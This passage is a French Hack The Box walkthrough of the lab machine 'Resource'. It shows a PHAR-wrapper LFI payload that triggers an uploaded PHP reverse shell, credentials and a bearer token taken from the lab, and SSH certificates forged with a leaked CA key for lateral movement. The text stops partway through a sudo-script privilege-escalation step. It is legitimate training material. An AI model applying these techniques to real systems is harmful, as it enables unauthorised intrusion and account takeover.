<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Resource</title>
<meta name=description content="Platforme: Hack The Box Lien: Resource Niveau: Difficile OS: Linux Resource met l&amp;rsquo;accent sur l&amp;rsquo;exploitation des fichiers SSH et des certificats …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-resource/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Resource"><meta property="og:description" content="Platforme: Hack The Box Lien: Resource Niveau: Difficile OS: Linux Resource met l&amp;rsquo;accent sur l&amp;rsquo;exploitation des fichiers SSH et des certificats …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Resource/Resource.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Resource/Resource.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Resource"><meta name=twitter:description content="Platforme: Hack The Box Lien: Resource Niveau: Difficile OS: Linux Resource met l&amp;rsquo;accent sur l&amp;rsquo;exploitation des fichiers SSH et des certificats …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-resource/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-resource/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Resource/Resource.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-resource/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-resource/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Resource</h1><small role=doc-subtitle></small><p class=post-date>12 min read |
<span class=post-date>22 Novembre 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/Resource>Resource</a></li><li>Niveau: Difficile</li><li>OS: Linux</li></ul><hr><p>Resource met l&rsquo;accent sur l&rsquo;exploitation des fichiers SSH et des certificats d&rsquo;autorité. L&rsquo;accès initial est obtenu via une attaque de désérialisation PHAR ciblant une fonctionnalité de téléchargement de fichiers. Ensuite, des identifiants d&rsquo;utilisateur sont extraits d&rsquo;un fichier HAR, permettant de progresser vers un autre utilisateur. La découverte de clés d&rsquo;autorité de certification nous permet de générer des clés SSH pour accéder à un troisième utilisateur. Enfin, une vulnérabilité d&rsquo;injection de globes dans un script bash est exploitée pour élever nos privilèges et obtenir l&rsquo;accès root sur un hôte différent.</p><p>Adresse IP cible - <code>10.10.11.27</code></p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>./nmap_scan.sh 10.10.11.27 Resource
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Running detailed scan on open ports: 22,80,2222
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-11-22 18:47 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.27
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.060s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 <span style=color:#56b6c2>(</span>protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 78:1e:3b:85:12:64:a1:f6:df:52:41:ad:8f:52:97:c0 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> e1:1a:b5:0e:87:a4:a1:81:69:94:9d:d4:d4:a3:8a:f9 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>80/tcp   open  http    nginx 1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://itrc.ssg.htb/
</span></span><span style=display:flex><span>2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 9.97 seconds
</span></span></code></pre></div><p>La cible utilise deux versions différentes de SSH: 9.2p1 sur le port 22 et 8.9p1 sur le port 2222. Elle a aussi un serveur web (HTTP) fonctionnant sur le port 80 avec une redirection vers <code>http://itrc.ssg.htb/</code> que nous ajoutons au fichier <code>etc/hosts</code>.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.27 itrc.ssg.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumération>Enumération</h2><p>Nous trouvons un site web pour un centre de ressources à <code>http://itrc.ssg.htb/</code> avec une fonction d&rsquo;authentification.</p><p><img src=/images/HTB-Resource/resource-website.png alt="Resource website"></p><p>Après s&rsquo;être connecté avec notre compte nouvellement créé, nous pouvons soumettre un nouveau ticket à <code>http://itrc.ssg.htb/?page=dashboard</code>.</p><p><img src=/images/HTB-Resource/dashboard-page.png alt="Ticekts list"></p><p>En cliquant sur <code>New Ticket</code>, on accède à <code>http://itrc.ssg.htb/?page=create_ticket</code>.</p><p><img src=/images/HTB-Resource/create_ticket.png alt="New ticket creation"></p><p>Deux choses sont à noter ici :</p><ul><li>le paramètre <code>?page</code> pourrait être vulnérable à la LFI</li><li>nous pourrions être en mesure de contourner les restrictions de la fonction de téléchargement et de télécharger un shell inversé.</li></ul><p>Créons un ticket et téléchargeons un fichier zip aléatoire pour observer le fonctionnement de l&rsquo;application.</p><p><img src=/images/HTB-Resource/test_zip.png alt="file upload test"></p><p>En cliquant sur un ticket spécifique, nous obtenons plus d&rsquo;informations.</p><p><img src=/images/HTB-Resource/uploads_folder.png alt="upload folder"></p><p>En survolant notre fichier, nous découvrons qu&rsquo;il est stocké dans le répertoire <code>/uploads</code>. Avec Wappalyzer nous réalisons que nous avons affaire à une application PHP, essayons d&rsquo;uploader un reverse shell PHP.</p><p><img src=/images/HTB-Resource/wappalyzer.png alt=wappalyzer></p><p>Sur <a href=https://www.revshells.com/>revshells</a> nous pouvons utiliser le shell <code>PHP Ivan Sincek</code> pour créer un fichier zip et l&rsquo;uploader sur la cible.</p><p><img src=/images/HTB-Resource/php_revshell_zip.png alt="reverse shell zip"></p><p><img src=/images/HTB-Resource/revshell_php.png alt="reverse shell upload"></p><p>Les url <code>http://itrc.ssg.htb/?page=/uploads/9870e12def3a5dbd118d0a66164fd72036d08d4e.zip/revshell.php</code> et <code>http://itrc.ssg.htb/uploads/9870e12def3a5dbd118d0a66164fd72036d08d4e.zip/revshell.php</code> ne parviennent pas à déclencher le reverse shell, nous devons donc trouver un autre moyen d&rsquo;exécuter notre fichier.</p><p><img src=/images/HTB-Resource/revshell_fail.png alt="reverse shell trigger failure"></p><h2 id=accès-initial>Accès initial</h2><p>Après quelques recherches, nous découvrons l&rsquo;attaque de désérialisation PHAR (PHP Archive) expliquée <a href=https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization>ici</a> et <a href=https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability>ici</a>.</p><blockquote><p>Lorsque nous créons une archive <code>.zip</code> contenant le fichier <code>revshell.php</code> et que nous y accédons en utilisant le wrapper <code>phar://</code>, PHP traite le fichier <code>.zip</code> comme une archive compatible PHAR. Le protocole <code>phar://</code> permet à PHP d&rsquo;accéder directement aux fichiers de l&rsquo;archive, y compris les scripts PHP exécutables. Lorsque l&rsquo;URL <code>http://itrc.ssg.htb/?page=phar://uploads/.../revshell</code> est utilisée, le serveur exécute le fichier <code>revshell.php</code> dans l&rsquo;archive en tant que code PHP, déclenchant ainsi le reverse shell. Cette opération fonctionne parce que le serveur utilise un mécanisme d&rsquo;inclusion de fichier non sécurisé (<code>include</code>, <code>require</code>, ou similaire) sans valider ou restreindre correctement le chemin d&rsquo;accès au fichier.</p></blockquote><p>En utilisant <code>http://itrc.ssg.htb/?page=phar://uploads/9870e12def3a5dbd118d0a66164fd72036d08d4e.zip/revshell</code> nous déclenchons avec succès le reverse shell. Nous obtenons une connexion sur notre listener en tant que <code>www-data</code> et nous sommes dans <code>/var/www/itrc</code>.</p><p><img src=/images/HTB-Resource/phar_revshell.png alt="phar reverse shell"></p><p><img src=/images/HTB-Resource/foothold.png alt=foothold></p><p>Dans le répertoire <code>uploads</code> nous trouvons de nombreuses archives ZIP, nous n&rsquo;en avons personnellement téléchargé que deux, voyons donc ce que contiennent les autres.</p><p><img src=/images/HTB-Resource/uploads_folder_ontarget.png alt="application upload directory"></p><p><img src=/images/HTB-Resource/upload_directory_content.png alt="upload directory content"></p><p>Nous exécutons la commande ci-dessous pour extraire toutes les archives du dossier.</p><pre tabindex=0><code>for file in *.zip; do unzip &#34;$file&#34;; done
</code></pre><p><img src=/images/HTB-Resource/bulk_extraction.png alt="bulk extraction"></p><p>Après l&rsquo;extraction, nous récupérons quelques clés publiques (pour les algorithmes Ed25519 et RSA), un fichier <code>.har</code> et les fichiers que nous avons précédemment téléchargés.</p><blockquote><p>Un fichier <code>.HAR</code> (HTTP Archive) est un format de fichier utilisé pour enregistrer les détails des échanges HTTP entre un client (généralement un navigateur web) et un serveur.</p></blockquote><p><img src=/images/HTB-Resource/files_after_extraction.png alt="files after extraction"></p><h3 id=shell-en-tant-que-msainristil-sur-lhôte-itrc>Shell en tant que msainristil (sur l&rsquo;hôte itrc)</h3><p>Nous trouvons deux utilisateurs sur le système: <code>msainristil</code> et <code>zzinter</code>. En utilisant <code>cat itrc.ssg.htb.har | grep msainristil</code> nous récupérons des identifiants qui sont <code>msainristil:82yards2closeit</code>.</p><p><img src=/images/HTB-Resource/user_list.png alt="user list"></p><p><img src=/images/HTB-Resource/msainristil_creds.png alt="msainristil credentials"></p><p>Nous nous connectons via SSH avec les informations d&rsquo;identification obtenues, mais nous ne trouvons pas de drapeau utilisateur, mais des fichiers liés à un certificat d&rsquo;autorité.</p><p><code>ca-itrc</code> et <code>ca-itrc.pub</code> sont très probablement les clés privée et publique d&rsquo;une autorité de certification utilisée pour signer des certificats, qui peuvent inclure des clés SSH ou d&rsquo;autres types de certificats.</p><p><img src=/images/HTB-Resource/msainristil_files.png alt="CA files"></p><h3 id=shell-en-tant-que-zzinter-sur-lhôte-itrc>Shell en tant que zzinter (sur l&rsquo;hôte itrc)</h3><p>Puisque nous avons accès à la clé privée du CA, nous pouvons créer une clé SSH pour nous connecter en tant que <code>zzinter</code>.</p><ol><li>Créer une paire de clés SSH pour zzinter.</li></ol><pre tabindex=0><code>ssh-keygen -t rsa -b 4096 -f id_rsa_zzinter
</code></pre><table><thead><tr><th>Command/Options</th><th>Description</th></tr></thead><tbody><tr><td>ssh-keygen</td><td>Outil de ligne de commande utilisé pour générer des clés SSH.</td></tr><tr><td>-t rsa</td><td>Spécifie le type de clé à créer (paire de clés RSA dans notre cas).</td></tr><tr><td>-b 4096</td><td>Longueur des bits, notre clé RSA aura une longueur de 4096 bits.</td></tr><tr><td>-f id_rsa_zzinter</td><td>Spécifie le nom du fichier.</td></tr></tbody></table><p><img src=/images/HTB-Resource/zzinter_keys.png alt="zzinter keys"></p><ol start=2><li>Créez le certificat SSH pour zzinter.</li></ol><pre tabindex=0><code>ssh-keygen -s ca-itrc -I zzinter_key_id -n zzinter -V +52w id_rsa_zzinter.pub
</code></pre><table><thead><tr><th>Command/Options</th><th>Description</th></tr></thead><tbody><tr><td>-s ca-itrc</td><td>Chemin d&rsquo;accès à la clé privée de l&rsquo;autorité de certification.</td></tr><tr><td>-I zzinter_key_id</td><td>Identifiant unique pour le certificat (vous pouvez choisir n&rsquo;importe quel nom).</td></tr><tr><td>-n zzinter</td><td>Le principal (utilisateur) pour lequel le certificat est valide.</td></tr><tr><td>-V +52w</td><td>Définit la période de validité (ici 52 semaines).</td></tr><tr><td>id_rsa_zzinter.pub</td><td>La clé publique que nous signons.</td></tr></tbody></table><p><img src=/images/HTB-Resource/zzinter_SSH_certificate.png alt="zzinter SSH certificate"></p><ol start=3><li>Se connecter à l&rsquo;aide de la clé SSH.</li></ol><pre tabindex=0><code>ssh -i id_rsa_zzinter zzinter@itrc.ssg.htb
</code></pre><p><img src=/images/HTB-Resource/zzinter_login.png alt="zzinter SSH login"></p><p>Ci-dessous se trouve le contenu du script <code>sign_key_api.sh</code>. Il automatise le processus de soumission d&rsquo;une clé publique SSH au service de signature <code>signserv.ssg.htb</code> pour générer un certificat SSH signé pour un utilisateur donné.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#7f848e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span>
</span></span><span style=display:flex><span>usage <span style=color:#56b6c2>()</span> <span style=color:#56b6c2>{</span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Usage: </span><span style=color:#e06c75>$0</span><span style=color:#98c379> &lt;public_key_file&gt; &lt;username&gt; &lt;principal&gt;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>exit</span> <span style=color:#d19a66>1</span>
</span></span><span style=display:flex><span><span style=color:#56b6c2>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#56b6c2>[</span> <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$#</span><span style=color:#98c379>&#34;</span> -ne <span style=color:#d19a66>3</span> <span style=color:#56b6c2>]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>    usage
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>public_key_file</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$1</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>username</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$2</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>principal_str</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$3</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>supported_principals</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;webserver,analytics,support,security&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>IFS</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#39;,&#39;</span> <span style=color:#e5c07b>read</span> -ra principal <span style=color:#56b6c2>&lt;&lt;&lt;</span> <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$principal_str</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>for</span> word in <span style=color:#98c379>&#34;</span><span style=color:#98c379>${</span><span style=color:#e06c75>principal</span>[@]<span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>; <span style=color:#c678dd>do</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> ! <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$supported_principals</span><span style=color:#98c379>&#34;</span> | grep -qw <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$word</span><span style=color:#98c379>&#34;</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Error: &#39;</span><span style=color:#e06c75>$word</span><span style=color:#98c379>&#39; is not a supported principal.&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Choose from:&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;    webserver - external web servers - webadmin user&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;    analytics - analytics team databases - analytics user&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;    support - IT support server - support user&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;    security - SOC servers - support user&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span>
</span></span><span style=display:flex><span>        usage
</span></span><span style=display:flex><span>    <span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>done</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#56b6c2>[</span> ! -f <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$public_key_file</span><span style=color:#98c379>&#34;</span> <span style=color:#56b6c2>]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Error: Public key file &#39;</span><span style=color:#e06c75>$public_key_file</span><span style=color:#98c379>&#39; not found.&#34;</span>
</span></span><span style=display:flex><span>    usage
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>public_key</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>cat <span style=color:#e06c75>$public_key_file</span><span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>curl -s signserv.ssg.htb/v1/sign -d <span style=color:#98c379>&#39;{&#34;pubkey&#34;: &#34;&#39;</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$public_key</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>&#39;&#34;, &#34;username&#34;: &#34;&#39;</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$username</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>&#39;&#34;, &#34;principals&#34;: &#34;&#39;</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$principal</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>&#39;&#34;}&#39;</span> -H <span style=color:#98c379>&#34;Content-Type: application/json&#34;</span> -H <span style=color:#98c379>&#34;Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE&#34;</span>
</span></span></code></pre></div><p>Utilisons le même processus que précédemment pour créer une clé SSH pour root, et voyons si nous y trouvons quelque chose d&rsquo;intéressant.</p><pre tabindex=0><code>ssh-keygen -t rsa -b 4096 -f id_rsa_root
ssh-keygen -s ca-itrc -I root_key_id -n root -V +52w id_rsa_root.pub
ssh -i id_rsa_root root@itrc.ssg.htb
</code></pre><p>Malheureusement, le compte root est vide, mais nous remarquons une adresse IP différente mentionnée (<code>172.223.0.3</code>). Cela signifie probablement que nous sommes à l&rsquo;intérieur d&rsquo;un conteneur dont nous devons sortir.</p><p><img src=/images/HTB-Resource/root_ssh.png alt="root SSH login"></p><h3 id=shell-en-tant-que-support-sur-lhôte-ssg>Shell en tant que support (sur l&rsquo;hôte ssg)</h3><p>Le script contient une liste d&rsquo;utilisateurs valides, nous allons donc utiliser l&rsquo;un d&rsquo;entre eux.</p><ol><li>Générer une clé SSH pour <code>support</code>.</li></ol><pre tabindex=0><code>ssh-keygen -t rsa -b 4096 -f id_rsa_support
</code></pre><ol start=2><li>Nous utilisons le script pour générer un certificat SSH signé.</li></ol><pre tabindex=0><code>bash ./sign_key_api.sh id_rsa_support.pub support support
</code></pre><ul><li>Vous recevrez le certificat SSH en format OpenSSH. Nous utilisons <code>echo "YOUR_SSH_CERTIFICATE" > id_rsa_support-cert.pub</code> pour le stocker dans un fichier car nous n&rsquo;avons pas accès à un éditeur de texte.</li></ul><p><img src=/images/HTB-Resource/support_ssh_cert.png alt="support SSH certificate"></p><ol start=3><li>Modifier les permissions des fichiers</li></ol><pre tabindex=0><code>chmod 600 id_rsa_support
chmod 600 id_rsa_support-cert.pub
</code></pre><ol start=4><li>Se connecter via SSH</li></ol><pre tabindex=0><code>ssh -i id_rsa_support -p 2222 support@172.223.0.1
</code></pre><p><img src=/images/HTB-Resource/support_ssh_login.png alt="root SSH login"></p><p>Le nom d&rsquo;hôte de notre précédente session SSH (avec root) était <code>itrc</code>, maintenant nous sommes connectés en tant que <code>support</code> et le nom d&rsquo;hôte est <code>ssg</code>. Le dossier personnel de <code>support</code> est vide, et <code>etc/passwd</code> montre que <code>zzinter</code> est aussi un utilisateur ici.</p><p><img src=/images/HTB-Resource/zzinter_ssg_host.png alt="zzinter user on ssg host"></p><h3 id=shell-en-tant-que-zzinter-sur-lhôte-ssg>Shell en tant que zzinter (sur l&rsquo;hôte ssg)</h3><p>Nous allons répéter le même processus et nous connecter en tant que <code>zzinter</code> sur le nouvel hôte. Le problème ici est que nous ne pouvons pas générer un certificat signé en utilisant le script parce que <code>zzinter</code> n&rsquo;est pas un principal supporté.</p><p>En examinant à nouveau le script, nous voyons qu&rsquo;il utilise <code>curl</code> pour récupérer le certificat SSH, la requête nécessite trois informations: une clé publique, un nom d&rsquo;utilisateur, et un ou plusieurs utilisateur(s). Actuellement, nous n&rsquo;avons pas de nom d&rsquo;utilisateur valide.</p><pre tabindex=0><code>curl -s signserv.ssg.htb/v1/sign -d &#39;{&#34;pubkey&#34;: &#34;&#39;&#34;$public_key&#34;&#39;&#34;, &#34;username&#34;: &#34;&#39;&#34;$username&#34;&#39;&#34;, &#34;principals&#34;: &#34;&#39;&#34;$principal&#34;&#39;&#34;}&#39; -H &#34;Content-Type: application/json&#34; -H &#34;Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE&#34;
</code></pre><p>Le contenu de <code>/etc/ssh/sshd_config.d/sshcerts.conf</code> nous montre qu&rsquo;un fichier situé dans <code>/etc/ssh/auth_principals</code> est utilisé par SSH sur cet hôte. En vérifiant le fichier, nous trouvons que <code>zzinter_temp</code> est un nom valide pour <code>zzinter</code>.</p><p><img src=/images/HTB-Resource/principal_file.png alt="SSH principal file"></p><p><img src=/images/HTB-Resource/zzinter_temp.png alt="zzinter valid principal name"></p><p>Avec tous les éléments nécessaires, nous pouvons maintenant répéter le processus utilisé précédemment.</p><ol><li>Générer une clé SSH pour zzinter.</li></ol><pre tabindex=0><code>ssh-keygen -t rsa -b 4096 -f id_rsa_zzinter
</code></pre><ol start=2><li>Pour obtenir notre certificat signé, nous envoyons une requête avec curl.</li></ol><pre tabindex=0><code>curl signserv.ssg.htb/v1/sign -d &#39;{&#34;pubkey&#34;: &#34;YOUR_GENERATED_PUBLIC_KEY&#34;, &#34;username&#34;: &#34;zzinter&#34;, &#34;principals&#34;: &#34;zzinter_temp&#34;}&#39; -H &#34;Content-Type: application/json&#34; -H &#34;Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE&#34;
</code></pre><ul><li>Stocker le certificat dans un fichier.</li></ul><pre tabindex=0><code>echo &#34;YOUR_SSH_CERTIFICATE&#34; &gt; id_rsa_zzinter-cert.pub
</code></pre><ol start=3><li>Modifier les permissions des clés.</li></ol><pre tabindex=0><code>chmod 600 id_rsa_zzinter
chmod 600 id_rsa_zzinter-cert.pub
</code></pre><ol start=4><li>Connectez-vous en tant que <code>zzinter</code> sur le nouvel hôte.</li></ol><pre tabindex=0><code>ssh -i id_rsa_zzinter -p 2222 zzinter@172.223.0.1
</code></pre><p><img src=/images/HTB-Resource/zzinter_ssh_ssg_host.png alt="zzinter ssh login on ssg host"></p><h2 id=elévation-de-privilèges---shell-en-tant-que-root-sur-lhôte-ssg>Elévation de Privilèges - Shell en tant que root (sur l&rsquo;hôte ssg)</h2><p>Le dossier personnel de <code>zzinter</code> ne contient que le drapeau de utilisateur, mais avec <code>sudo -l</code> nous apprenons que cet utilisateur peut exécuter <code>/opt/sign_key.sh</code> en tant que root sans fournir de mot de passe.</p><p><img src=/images/HTB-Resource/sudo-l-cmd.png alt="sudo -l command"></p><p>Vous trouverez ci-dessous le contenu de <code>sign_key.sh</code>. Le script est similaire au script <code>sign_key_api.sh</code>, il utilise <code>ssh-keygen</code> pour signer une clé publique SSH en utilisant la clé privée de l&rsquo;autorité de certification spécifiée pour créer un certificat SSH signé. Il attend cinq arguments et effectue également une opération de comparaison avec le fichier <code>/etc/ssh/ca-it</code>.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#7f848e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span>
</span></span><span style=display:flex><span>usage <span style=color:#56b6c2>()</span> <span style=color:#56b6c2>{</span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Usage: </span><span style=color:#e06c75>$0</span><span style=color:#98c379> &lt;ca_file&gt; &lt;public_key_file&gt; &lt;username&gt; &lt;principal&gt; &lt;serial&gt;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>exit</span> <span style=color:#d19a66>1</span>
</span></span><span style=display:flex><span><span style=color:#56b6c2>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#56b6c2>[</span> <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$#</span><span style=color:#98c379>&#34;</span> -ne <span style=color:#d19a66>5</span> <span style=color:#56b6c2>]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>    usage
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
